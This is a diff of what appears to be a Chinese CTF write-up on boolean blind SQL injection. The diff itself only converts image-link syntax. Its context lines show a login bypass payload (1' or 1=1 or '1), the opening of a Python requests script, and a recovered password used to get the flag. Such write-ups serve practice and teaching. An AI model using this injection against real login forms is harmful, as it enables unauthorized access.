@@ -1,15 +1,15 @@
-![[Pasted image 20230120113124.png|500]]
+![](<./img/Pasted image 20230120113124.png>)
 
-![[Pasted image 20230120113103.png|500]]
+![](<./img/Pasted image 20230120113103.png>)
 
-![[Pasted image 20230120113230.png|500]]
+![](<./img/Pasted image 20230120113230.png>)
 
 ```
 username=admin
 passwd=1' or 1=1 or '1
 ```
 
-![[Pasted image 20230120150739.png|500]]
+![](<./img/Pasted image 20230120150739.png>)
 
 ```python
 import requests
@@ -111,6 +111,6 @@ YOU_WILL_NEVER_KNOW7788990
 
 转为小写之后拿去登录就拿到了`flag`
 
-![[Pasted image 20230120162247.png|500]]
+![](<./img/Pasted image 20230120162247.png>)
 
 #Web #SQL注入 #布尔盲注 #绕过
